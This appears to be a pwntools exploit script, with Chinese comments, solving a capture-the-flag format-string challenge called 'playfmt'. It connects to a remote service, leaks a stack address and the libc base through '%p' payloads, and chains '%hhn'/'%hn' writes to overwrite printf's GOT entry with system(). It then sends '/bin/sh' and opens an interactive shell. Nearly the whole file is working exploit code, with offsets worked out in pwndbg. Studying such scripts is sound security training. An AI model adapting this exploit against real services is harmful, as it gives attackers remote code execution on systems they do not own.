'''
@Author       : 白银
@Date         : 2023-03-03 19:14:11
@LastEditors  : 白银
@LastEditTime : 2023-03-06 17:51:20
@FilePath     : /pwn/playfmt.py
@Description  : playfmt  https://www.bilibili.com/video/BV1uK411w72E?t=637.7
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 2

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './playfmt'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("129.226.211.132", 8888)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    
    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/x64_libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/x86_libc.so.6')
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

printf_got = 0x804A010 # 怎么找的https://rms1ady5ht.feishu.cn/wiki/wikcnLFeTi22tR47hVjZ307b7Ad#AmSAd8YmOogWCwxGqHTcpUdJnP7
# %5$p是pwndbg输入数据后栈上esp里面的从接受到的输入开始的第6个，%15$p是pwndbg输入数据后栈上esp里面的从接受到的输入开始的第16个
# 或者，%5$p是pwndbg输入数据后栈上esp里面的_GLOBAL_OFFSET_TABLE_，%15$p是pwndbg输入数据后栈上ebp里面的第一个(__libc_start_main+xxx) ◂— add esp, 0x多少
# %15p出来的是真实地址
payload = flat(['aaaa%5$pbbbb%15$p'])
io.send(payload)
io.recvuntil('aaaa')
stack = int(io.recv(10), 16)
print("---stack: ", hex(stack))
# a = io.recv()
# print(io.recv()[4:16])
io.recvuntil('bbbb')

libc_base = int(io.recv(10), 16) - 0x1ae46 # 0x1ae46是pwndbg输入数据后栈上ebp里面的第一个(__libc_start_main+xxx) ◂— add esp, 0x多少的地址与libc基地址的distance
# libc_base = int(io.recv(10), 16) - int(the_distance)
print("---libc_base: ", hex(libc_base))
one32 = [0x13ea3b, 0x13ea3c] # one_gadget /the/given/x86_libc
onegadget = libc_base + one32[1]
system = libc_base + libc.symbols['system']
print("---system: ", hex(system))
stack1 = stack - 0xc # 低位替身
stack2 = stack + 0x4 # 高位替身
print("---stack1: ", hex(stack1))
print("---stack2: ", hex(stack2))

'''
先把ebp一行三个串起来，把最后一个箭头指向的改为与printf_got相似的地方的前面地址，应该有nop
比如ebp那行原来是  07:001c│ ebp 0xffffd0d8 —▸ 0xffffd0e8 —▸ 0xffffd0f8 ◂— 0x0
printf_got相似的地方原来是  08:0020│     0xffffd0dc —▸ 0x8048584 (play+59) ◂— nop
那么把0xffffd0f8改成0xffffd0dc
不能直接把原来相似的地方改成printf_got，改不了
'''
payload = flat(['%', str((stack1)&0xff), 'c', '%6$hhn']) 
io.sendline(payload)

'''
改完后的ebp那行变成  07:001c│ ebp 0xffffd0d8 —▸ 0xffffd0e8 —▸ 0xffffd0dc —▸ 0x8048584 (play+59) ◂— nop
现在往后一个，从0xffffd0e8开始找串，找到这一行  0b:002c│     0xffffd0e8 —▸ 0xffffd0dc —▸ 0x8048584 (play+59) ◂— nop
那么现在就可以把0x8048584变成printf_got的地址0x804A010
'''
payload = flat([''])
payload += flat(['%', str(printf_got&0xffff), 'c', '%10$hn'])
io.sendline(payload)


# 保证完全写入了，校验
# while True:
#     io.sendline('King')
#     sleep(0.01)
#     data = io.recv()
#     # print(type(data))
#     if data.find(b'King') != -1:
#         break

'''
````````````````````````
EOF报错
下面开始

````````````````````````
'''

payload = flat([''])
payload += flat(['%', str((stack2)&0xff), 'c', '%6$hhn'])
io.sendline(payload)
payload = flat([''])
payload += flat(['%', str((printf_got + 2)&0xffff), 'c', '%10$hn'])
io.sendline(payload)

payload = flat([''])
payload += flat(['%', str((system>>16)&0xff), 'c', '%10$hhn'])
payload += flat(['%'], str(((system)&0xffff)-((system>>16)&0xff)), '%7$hn')
io.sendline(payload)

io.sendline('/bin/sh')

# padding = 0x10 # ida看，buf和r差多少
# return_addr = 0x401146 # p &func
# payload = flat(['a' * padding, return_addr])

# delimiter = 'input:'

# if state == 0:
#     io.sendline(payload)  # 远程用
# else:
#     io.sendline(payload)  #本地用

io.interactive()